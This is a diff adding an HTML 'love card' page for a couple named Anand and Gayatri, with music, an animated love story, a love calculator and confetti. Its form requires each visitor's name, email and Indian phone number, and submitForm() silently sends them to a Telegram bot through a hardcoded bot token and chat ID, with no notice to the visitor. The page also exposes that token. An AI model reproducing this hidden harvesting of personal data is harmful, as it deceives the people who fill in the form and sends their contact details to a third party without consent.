@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Anand & Gayatri</title>
+  <link rel="stylesheet" href="assets/style.css">
+</head>
+<body>
+  <audio autoplay loop>
+    <source src="assets/music.mp3" type="audio/mp3">
+    Your browser does not support the audio element.
+  </audio>
+
+  <div id="welcome">Welcome</div>
+  <div id="formSection" class="hidden">
+    <input type="text" id="name" placeholder="Your Name" required><br>
+    <input type="email" id="email" placeholder="Your Email" required><br>
+    <input type="tel" id="phone" placeholder="+91XXXXXXXXXX" required><br>
+    <button onclick="submitForm()">Submit</button>
+  </div>
+
+  <div id="startPage" class="hidden">
+    <div class="animated-text" id="anand">Anand</div>
+    <div class="heart">❤️</div>
+    <div class="animated-text" id="gayatri">Gayatri</div>
+    <button class="heart-button" onclick="showLoveMessage()">Love</button>
+  </div>
+
+  <div id="loveMessage" class="hidden message-box">
+    <h2>Anand & Gayatri</h2>
+    <p id="typewriter"></p>
+    <button onclick="showLoveCalc()">Continue</button>
+  </div>
+
+  <div id="loveCalc" class="hidden message-box">
+    <h2>Love Calculator</h2>
+    <p><b>Anand + Gayatri = 100%</b></p>
+    <p>Your love is perfect and unbreakable!</p>
+    <button onclick="showThanks()">Home</button>
+  </div>
+
+  <div id="thanks" class="hidden message-box">
+    <h2>Thank You!</h2>
+    <p id="thankMessage"></p>
+    <div id="countdown"></div>
+    <button onclick="goBack()">Back</button>
+  </div>
+
+  <div id="snowfall" class="hidden"></div>
+
+  <script src="assets/confetti.min.js"></script>
+  <script src="assets/heart-cursor.js"></script>
+  <script>
+    window.onload = () => {
+      setTimeout(() => {
+        document.getElementById("welcome").classList.add("hidden");
+        document.getElementById("formSection").classList.remove("hidden");
+      }, 2000);
+    };
+
+    function submitForm() {
+      const name = document.getElementById("name").value;
+      const email = document.getElementById("email").value;
+      const phone = document.getElementById("phone").value;
+      if (!name || !email || !phone.startsWith('+91')) {
+        alert("Please fill all fields correctly.");
+        return;
+      }
+
+      const message = `New Visitor:\nName: ${name}\nEmail: ${email}\nPhone: ${phone}`;
+      fetch(`https://api.telegram.org/bot7881165847:AAErGr-hKtfCrgY2o4KMCqJVxeQRD8MCKnI/sendMessage`, {
+        method: 'POST',
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: "7291963092", text: message })
+      });
+
+      document.getElementById("formSection").classList.add("hidden");
+      document.getElementById("startPage").classList.remove("hidden");
+    }
+
+    function showLoveMessage() {
+      document.getElementById("startPage").classList.add("hidden");
+      document.getElementById("loveMessage").classList.remove("hidden");
+      typewriter("Once upon a time, Anand met Gayatri, and from that moment, their hearts beat as one. Their love grew with every sunrise, a bond that no storm could break. Through smiles, tears, and laughter, they wrote their own love story — timeless, pure, and forever together.");
+    }
+
+    function showLoveCalc() {
+      document.getElementById("loveMessage").classList.add("hidden");
+      document.getElementById("loveCalc").classList.remove("hidden");
+    }
+
+    function showThanks() {
+      document.getElementById("loveCalc").classList.add("hidden");
+      document.getElementById("thanks").classList.remove("hidden");
+      document.getElementById("thankMessage").innerText = "Thank you for being a part of our love story.";
+      startCountdown("2022-01-01");
+      confetti.start();
+    }
+
+    function goBack() {
+      document.getElementById("thanks").classList.add("hidden");
+      document.getElementById("formSection").classList.remove("hidden");
+      confetti.stop();
+    }
+
+    function typewriter(text) {
+      const element = document.getElementById("typewriter");
+      let i = 0;
+      element.innerHTML = "";
+      const interval = setInterval(() => {
+        if (i < text.length) {
+          element.innerHTML += text.charAt(i);
+          i++;
+        } else {
+          clearInterval(interval);
+        }
+      }, 50);
+    }
+
+    function startCountdown(startDate) {
+      const start = new Date(startDate);
+      const now = new Date();
+      const diff = now - start;
+      const days = Math.floor(diff / (1000 * 60 * 60 * 24));
+      document.getElementById("countdown").innerText = `It's been ${days} days since Anand & Gayatri met.`;
+    }
+  </script>
+</body>
+</html>
